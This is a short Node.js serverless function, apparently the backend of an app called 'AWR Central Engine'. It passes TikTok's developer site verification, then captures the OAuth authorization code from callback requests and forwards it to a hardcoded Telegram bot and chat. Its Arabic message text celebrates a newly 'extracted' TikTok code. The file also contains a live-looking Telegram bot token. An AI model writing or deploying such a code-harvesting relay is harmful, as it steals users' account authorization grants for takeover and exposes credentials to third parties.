const https = require('https');

const TELEGRAM_TOKEN = '8764995786:AAH6TdLNgNP7n13JKr7M8GSFlgW3Sr87dXE';
const TELEGRAM_CHAT_ID = '7644255708';

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  
  const url = req.url || '';

  if (url.includes('tiktok-developers-site-verification')) {
    res.setHeader('Content-Type', 'text/plain');
    return res.end('Tiktok-developers-site-verification=X0rbCBz0sv0XGnslTmw9ZyRWVDIdmha5');
  }

  if (url.includes('/api/callback') || url.includes('/api/auth')) {
    const urlParts = url.split('?');
    const queryString = urlParts.length > 1 ? urlParts[1] : '';
    const params = new URLSearchParams(queryString);
    const code = params.get('code');

    if (code) {
      const messageText = `🎯 تم استخراج رمز تيك توك جديد!\n\n🔑 الـ Code هو:\n${code}\n\n⚙️ المحرك: AWR Central`;
      
      const postData = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: messageText
      });

      const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${TELEGRAM_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(postData)
        }
      };

      // إرسال الطلب بشكل متزامن وإجبار السيرفر على الانتظار
      await new Promise((resolve) => {
        const telegramReq = https.request(options, (telegramRes) => {
          telegramRes.on('data', () => {});
          telegramRes.on('end', () => resolve());
        });

        telegramReq.on('error', (error) => {
          console.error('Telegram Error:', error);
          resolve();
        });

        telegramReq.write(postData);
        telegramReq.end();
      });
    }

    res.setHeader('Content-Type', 'application/json');
    return res.end(JSON.stringify({
      status: "success",
      message: "AWR Engine: Interface Ready",
      received_code: code || "No code provided yet"
    }));
  }

  res.setHeader('Content-Type', 'text/plain');
  res.end('AWR Central Engine Ready');
};
